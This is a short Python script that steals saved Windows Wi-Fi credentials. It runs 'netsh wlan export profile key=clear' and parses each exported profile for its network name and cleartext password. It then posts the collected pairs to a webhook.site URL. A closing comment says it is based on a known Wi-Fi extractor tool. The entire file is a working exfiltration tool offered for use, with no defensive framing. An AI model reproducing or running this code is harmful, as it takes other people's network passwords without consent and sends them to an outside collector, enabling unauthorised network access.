import subprocess
import os
import sys
import requests
import xmltodict

url = 'https://webhook.site/f10ccd77-3229-4a4f-b63b-18f1cbe8cec2'
payload = {"WAP":[]}

command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

print(command_output)

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        xml_content = open(filename,'rb')
        as_dict = xmltodict.parse(xml_content)
        xml_content.close()
        payload['WAP'].append("Access Point Name: %s - Password: %s"% (as_dict['WLANProfile']['name'],as_dict['WLANProfile']['MSM']['security']['sharedKey']['keyMaterial']))
        #os.remove(filename)

if len(payload["WAP"]) >= 1:
    print("Wi-Fi profiles have been found. Check your webhook to view them!")
else:
    print("No Wi-Fi profiles have been found. Now Exiting....")
    sys.exit()

final_payload = ''
for ssid in payload['WAP']:
    final_payload += '%s; \n' % ssid
r = requests.post(url, params="format=json", data=final_payload)


#Based on the Windows WiFi Extractor from Heath Adams